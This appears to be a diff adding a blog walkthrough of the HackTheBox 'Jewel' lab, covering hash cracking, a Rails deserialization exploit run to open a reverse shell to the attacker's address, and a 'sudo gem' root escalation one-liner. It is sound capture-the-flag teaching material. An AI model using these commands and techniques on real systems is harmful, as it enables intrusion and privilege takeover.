@@ -1,0 +1,118 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Jewel HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/jewel-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-28T15:45:16+00:00">February 28, 2021</time><time class="updated" datetime="2025-06-22T10:58:57+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Jewel. It was created by <span style="color: #0000ff;"><strong>polarbearer</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating HTTP Service on 8000</span></li>
+<li><span style="color: #000000;">Enumerating Database File</span></li>
+<li><span style="color: #000000;">Extracting Password hashes</span></li>
+<li><span style="color: #000000;">Cracking hash using John the Ripper</span></li>
+<li><span style="color: #000000;">Enumerating the Gemfile</span></li>
+<li><span style="color: #000000;">Searching for CVE</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating the Deserialization Vulnerability</span></li>
+<li><span style="color: #000000;">Searching for an Exploit</span></li>
+<li><span style="color: #000000;">Running the Exploit</span></li>
+<li><span style="color: #000000;">Getting shell as bill user</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating Authenticator file</span></li>
+<li><span style="color: #000000;">Using Online Authenticator for getting TOTP</span></li>
+<li><span style="color: #000000;">Enumerating Sudo Permissions</span></li>
+<li><span style="color: #000000;">Exploiting permissions on Gem</span></li>
+<li><span style="color: #000000;">Getting Root Shell</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;"><strong>IP Address assigned: 10.129.104.163</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC 10.129.104.163</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q0mYkqxA5Xg/YDu3_FnZg2I/AAAAAAAAuWU/m6DDgCoS7XYvCDq0W1oSQCPE-jlo6GwHACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that SSH (22), HTTP (8000) and HTTP Proxy (8080) service is running on the machine. We can see that the service on 8000 is redirected to gitweb. It is worth a look.</span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">We do not posses the credentials for the SSH login so we will be moving over to the HTTP service for Enumeration. We open the HTTP service on the Web Browser to find that it was running Git web interface. It is basically a web Version of interacting with the git documents and files. We found one file inside the projects directory. We click on the .git  to advance further.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.104.163:8000/gitweb/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-g1PfsYPECZE/YDu4DKawGlI/AAAAAAAAuWY/lFWBGwdIlv46EFWOKou9w9XvUoz1Jq82QCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Then, we move further to find a log directory. It contained one commit. Clicking on the Commit link we are presented the list of files inside the commit. In this we find a bd.sql file. It seemed interesting.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z5g0JbnLAMw/YDu4IP_GHCI/AAAAAAAAuWc/Ck6Vqru5ZAUXy_WudDNecwbUJl4fnMcYwCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We click on the bd.sql file to find the database file. It contained two users and their password hashes. We copied the hash values and created two files each by the name of the user they belong to.  </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bill    bill@mail.htb $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+jennifer        jennifer@mail.htb $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GZVylENo_7U/YDu4LsQZyCI/AAAAAAAAuWg/mo1FZTsHjJQkXwgMhPdA6I5tsuiLU9wTQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We got two files bill and jennifer. Then, we used the rockyou dictionary with John the Ripper to try and crack the hash. After taking huge amount of time and multiple failures it was able to crack the password for the user bill. It was not able to crack the one for Jennifer. We now have the password for the user bill.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt bill</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-35-oekgCdfA/YDu4Qs0Q7bI/AAAAAAAAuWo/yiGIls6EQ0M9W1h1WXzdumr7mvC7Awu2gCLcBGAsYHQ/s16000/5.1.png"/></span></p>
+<p><span style="color: #000000;">We tried to use the newly cracked password on the SSH service but were unsuccessful. This made us think that this credential would be usable at another point down the road. Moving back to the gitweb we found. We enumerated it further to find that Gemfile. It almost always contains the version information regarding the Ruby Applications. Upon reading we found that the application is running Ruby 2.5.5 and Rails 5.2.2.1. Time to search for exploits.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jndwuq4larg/YDu4T15BxLI/AAAAAAAAuWw/4UrMKu0Obj4mWxPoJVRIffOYUxoxbRQPACLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">We googled the versions with the CVE keyword to find CVE MITRE article. It usually contains a list of all the vulnerabilities that a particular version is at risk of.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ckzkGXYRee8/YDu4kMKc7RI/AAAAAAAAuXE/lshlZq8Di-I7BtGiyFz2m-r2-79Koa7_wCLcBGAsYHQ/s16000/6.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">We see a bunch of vulnerabilities. The first one requires PostgreSQL, we didn’t find any evidence that it is installed on the target server. Then there is a Denial-of-Service Attack. We do not want to DoS the server. Then we have a bunch of CSRF vulnerabilities, but through our enumerations, we found that a scenario is not building up for a successful CSRF attack. Last we came across Deserialization. This seemed of some interest.</span></p>
+<p><span style="color: #000000;"><strong>https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=rails</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KXnUQKJ3BoE/YDu4n-65H5I/AAAAAAAAuXI/LZWHKurY9YQH9jd4DxNSIJt2sTXcphqiQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We googled for any ready exploit for this CVE and we were in luck. Some user has already created an exploit that gives shell directly. Surprisingly it was the third link in a Google Search. You can find the exploit by clicking <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://raw.githubusercontent.com/umiterkol/CVE-2020-8165--Auto-Shell/main/CVE-2020-8165--Auto-Shell.py">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Z7hYU-BSGPE/YDu4r4TgFXI/AAAAAAAAuXM/R_0_jFuCKXM97MORQDzlYwbgXKIY8WG4QCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We browsed the Git of that exploit and read the code to understand the working. We found that it takes the Target IP Address and then browses it, then creates a user by the name of doctor. Then uses the credentials of the newly created user to login. This gives it an Authentication Token. Then it browses the Profile Update section of the Application and then it Inputs a serialized shell script inside and sends it to the target server. Due to the vulnerability, the server thinks it is genuine serialized code so it extracts it and then when it gets the shell invocation command. It feels that it is genuine instruction as well. So, it executes it. To run this exploit, you will need the Target IP Address, Local IP Address and a Local Port. We provided all these and started a listener on the port specified.</span></p>
+<p><span style="color: #000000;">Here, we have the following configurations</span></p>
+<p><span style="color: #000000;">raj.py: Exploit script name</span></p>
+<p><span style="color: #000000;">10.129.104.163: Remote Host</span></p>
+<p><span style="color: #000000;">10.10.14.48: Local Host</span></p>
+<p><span style="color: #000000;">1234: Local Port</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 raj.py 10.129.104.163 10.10.14.48 1234</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NeKdC8u1eS4/YDu4viD5CRI/AAAAAAAAuXQ/P3euY0IEGhMB82DOsEeIoead3ev7plj8QCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">In a few moments, we see that we have a shell of the user bill. We start our enumeration of the user flag and found it inside the home directory of bill user. We read the user flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+ls -la
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_v704d_SXdw/YDu4zWbLjzI/AAAAAAAAuXU/dYEY3FRsdu8Bv4KLoWpi9rpiV8lPfgy2ACLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Now we see that a hidden file by the name of .google_authenticator.  This seems interesting. We read it to find a code inside of it. Holding the thought for the authenticator code, we decided to run the sudo -l to enumerate the binaries that we can execute with elevated privileges. It asks us for the password of user bill. We cracked that earlier. We enter spongebob as bill’s password. Then it asks us for a verification code. This means that google authenticator is not a rabbit hole. We need to setup an authenticator using the code provided to us.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat .google_authenticator
+2UQI3R52WFCLE6JTLDCSJYMJH4
+sudo -l
+python -c 'import pty;pty.spawn("bash")'
+sudo -l
+spongebob</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f9JUvbTXIno/YDu43dvLN4I/AAAAAAAAuXY/uk9FHM4hu-gmsARkjsr5XsldTCVuFh69wCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">We searched for an authenticator, it provided us with various plugins but we are bit clingy to not put a plugin on our browser. Here we found a TOTP Token Generator. All it required was the code that we found and it provided us with the TOTP which we can use.</span></p>
+<h5><span style="color: #000000;"><a style="color: #000000;" href="https://totp.danhersam.com/">https://totp.danhersam.com/</a></span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3cmO50CVIQI/YDu47NGz5nI/AAAAAAAAuXc/5m5r4st8lhcYKw4av8wWx5DBYCbC2tCNwCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We ran the sudo -l again and this time we entered the code it asks for and we found that we can execute gem. Lucky for us that gem is one of the LOLBINs. Means it can be directly exploited using a single line of code.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+spongebob
+104007</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NTzyXK5iAlc/YDu4_D4-MrI/AAAAAAAAuXg/YKgJ1hhP_EcAUFrVI-7liU1LdIkiejzbQCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">We head to the <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://gtfobins.github.io/gtfobins/gem/"><strong>GTFOBIN</strong> </a></span>website and found the one-liner code to exploit the sudo permissions on the gem. It gave us root in no time. This concludes this machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+id
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3FHPpT9i4T4/YDu5C93jmCI/AAAAAAAAuXk/fpU3CuuH5l0gW_MhjWJDBfuFdpl3G1eNQCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
